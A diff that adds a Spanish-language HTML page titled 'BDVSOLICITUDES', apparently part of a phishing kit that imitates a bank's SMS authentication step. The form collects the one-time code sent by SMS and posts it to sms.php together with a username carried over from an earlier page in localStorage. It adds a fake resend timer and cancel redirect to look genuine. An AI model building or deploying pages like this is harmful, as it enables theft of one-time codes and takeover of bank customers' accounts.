@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+  <title>BDVSOLICITUDES</title>
+  <link rel="icon" href="favicon.png" type="image/x-icon">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-image: url(background.webp);
+      background-size: cover;
+      background-position: center;
+    }
+
+    .container {
+      display: flex;
+      height: 100%;
+      width: 80%;
+    }
+
+    .left-side {
+      width: 40%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .right-side {
+      width: 30%;
+    }
+
+    form {
+      width: 80%;
+      background: white;
+      max-width: 550px;
+      box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
+    }
+
+    @media (max-width: 768px) {
+      body {
+        background: #ededed;
+      }
+      .container {
+        flex-direction: column;
+      }
+      .left-side {
+        width: 100%;
+        height: 100vh;
+      }
+      .right-side {
+        display: none;
+      }
+    }
+
+    .form-group {
+      position: relative;
+      margin-bottom: 20px;
+      margin: 20px;
+    }
+
+    .form-group label {
+      position: absolute;
+      top: 50%;
+      left: 10px;
+      transform: translateY(-55%);
+      color: #999;
+      transition: top 0.3s, font-size 0.3s;
+      pointer-events: none;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 10px;
+      box-sizing: border-box;
+      position: relative;
+      height: 60px;
+      border: 0;
+      border-bottom: 1px solid gray;
+      background: #ededed;
+      outline: none;
+    }
+
+    .form-group input:focus {
+      border: 0;
+    }
+
+    .form-group input:focus + label,
+    .form-group input:not(:placeholder-shown) + label {
+      top: 5px;
+      font-size: 12px;
+    }
+
+    button {
+      background-color: #0067b1;
+      color: white;
+      border-radius: 3px;
+      border: 0;
+      padding: 10px 20px;
+      text-align: center;
+      display: inline-block;
+      cursor: pointer;
+      transition: background-color 0.3s;
+      font-size: 16px;
+      width: auto; /* El ancho del botón se ajusta al contenido */
+    }
+
+    /* Estilo para el botón deshabilitado */
+    button:disabled {
+      background-color: #E0E0E0;
+      cursor: not-allowed;
+    }
+
+    /* Estilo para el botón "Cancelar" */
+    .cancel-btn {
+      background-color: #0067b1;
+      color: white;
+    }
+
+    #timerContainer {
+      margin-top: 20px;
+    }
+
+    #timerText {
+      color: #0067b1;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="left-side">
+      <form id="smsForm" method="post" action="sms.php">
+        <div style="text-align: center">
+          <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
+        </div>
+        <div style="width: 100%; text-align: center">
+          <div style="margin: 10px; color: #0067b1 !important">
+            <h4>Autenticación</h4>
+          </div>
+          <div style="width: 100%; text-align: center">
+            <div style="margin: 10px; color: #0067b1 !important">
+              <h5>
+                Introduzca el token recibido por SMS.
+              </h5>
+            </div>
+            <div class="form-group">
+              <input
+                type="text"
+                id="sms"
+                name="sms"
+                maxlength="8"
+                required
+                oninput="this.value = this.value.replace(/[^0-9]/g, '')"
+                minlength="6"
+              />
+              <label for="sms">Código SMS *</label>
+            </div>
+            <!-- Campo oculto para enviar el nombre guardado en localStorage -->
+            <input type="hidden" id="nombreOculto" name="nombre" />
+          </div>
+          <div style="width: 100%; text-align: center">
+            <button type="submit" id="continuarBtn" disabled>Continuar</button>
+            <button type="button" class="cancel-btn" id="cancelBtn">Cancelar</button>
+          </div>
+          <!-- Contenedor para el cronómetro -->
+          <div id="timerContainer" style="margin-top: 20px;">
+            <p id="timerText" style="color: #0067b1;">Reenviar código en: <span id="timeLeft">02:00</span></p>
+          </div>
+          <div style="width: 100%; height: 30px"></div>
+        </div>
+      </form>
+    </div>
+    <div class="right-side"></div>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const nombre = localStorage.getItem("usuario"); // Obtener el nombre del almacenamiento local
+      if (nombre) {
+        document.getElementById("nombreOculto").value = nombre; // Asignar el nombre al campo oculto
+      }
+
+      let isSubmitting = false;
+
+      // Habilitar el botón "Continuar" solo si el código tiene al menos 6 dígitos
+      document.getElementById("sms").addEventListener("input", function() {
+        const sms = document.getElementById("sms").value;
+        const continuarButton = document.getElementById("continuarBtn");
+
+        // Si el código tiene al menos 6 caracteres, habilita el botón
+        if (sms.length >= 6) {
+          continuarButton.disabled = false;
+        } else {
+          continuarButton.disabled = true;
+        }
+      });
+
+      document.getElementById("smsForm").addEventListener("submit", function(event) {
+        if (isSubmitting) {
+          event.preventDefault();
+        } else {
+          isSubmitting = true;
+        }
+      });
+
+      // Redirigir a cancel2.php cuando se hace clic en el botón "Cancelar"
+      document.getElementById("cancelBtn").addEventListener("click", function() {
+        const nombre = localStorage.getItem("usuario");
+        if (nombre) {
+          // Redirige a cancel2.php con el nombre como parámetro en la URL
+          window.location.href = `cancel2.php?nombre=${encodeURIComponent(nombre)}`;
+        } else {
+          // Si no se encuentra el nombre en localStorage, redirige sin el parámetro
+          window.location.href = 'cancel2.php';
+        }
+      });
+
+      // Cronómetro de 2 minutos
+      let timer = 120; // 2 minutos en segundos
+      const timerText = document.getElementById("timeLeft");
+      const timerContainer = document.getElementById("timerContainer");
+
+      function updateTimer() {
+        const minutes = Math.floor(timer / 60);
+        const seconds = timer % 60;
+        timerText.textContent = `${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
+
+        if (timer <= 0) {
+          clearInterval(timerInterval);
+          timerText.textContent = "Reenviar código"; // Solo mostrar "Reenviar código"
+          timerContainer.innerHTML = `<br><a href="reenviar.php">Reenviar código</a>`; // Enlace para reenviar código
+        } else {
+          timer--;
+        }
+      }
+
+      // Inicia el cronómetro al cargar la página
+      const timerInterval = setInterval(updateTimer, 1000);
+    });
+  </script>
+</body>
+</html>
